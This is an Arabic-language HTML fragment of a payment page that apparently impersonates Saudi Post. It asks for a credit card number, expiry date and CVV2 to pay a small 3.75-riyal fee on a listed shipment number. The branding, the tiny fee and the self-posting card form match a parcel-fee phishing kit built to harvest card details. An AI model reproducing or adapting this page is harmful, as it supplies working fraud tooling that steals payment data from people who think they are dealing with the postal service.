...
<form method="post">                   
                <center> <span class="generic_page_title">تفاصيل الدفع</span></center>
                 <span class="login_subtitle"> طريقة الدفع</span>

                  
                    <div class="form_group">
                        <input autocomplete="off" class="form_control" data-val="true" data-val-required="حقل مطلوب" id="ccnum" name="ccnum" placeholder="بطاقة الائتمان" type="text" value="" required maxlength="16" minlength="16">
                    </div>

                    <div class="form_group">
                        <input autocomplete="off" class="form_control" data-val="true" data-val-required="حقل مطلوب" id="exp" name="exp" placeholder="تاريخ الانتهاء" type="text" value="" required maxlength="5" minlength="5">
                    </div>

                    <div class="form_group">
                        <input autocomplete="off" class="form_control" data-val="true" data-val-required="حقل مطلوب" id="cvv" name="cvv" placeholder="CVV2" type="text" value="" required maxlength="3" minlength="3">
                    </div>

                    <center> <div style="display: block;" class="section_btns">
                        
                        <button class="btn primary_btn" type="submit" name="doSubmit">تأكيد</button>
                    </div>
                    </center>
...
<div class="col aos-init aos-animate" data-aos="fade-left" data-aos-delay="1300">
    ...
    <div class="download_spl_app">
        ...
        <p>
            <label for="">المبلغ : 3.75 ريال سعودي</label>
        </p>
        <hr>
        <p>الرمز التسلسلي :UG6412830655SA</p>
        <hr>
        <p>
        الشركة : Saudi Post
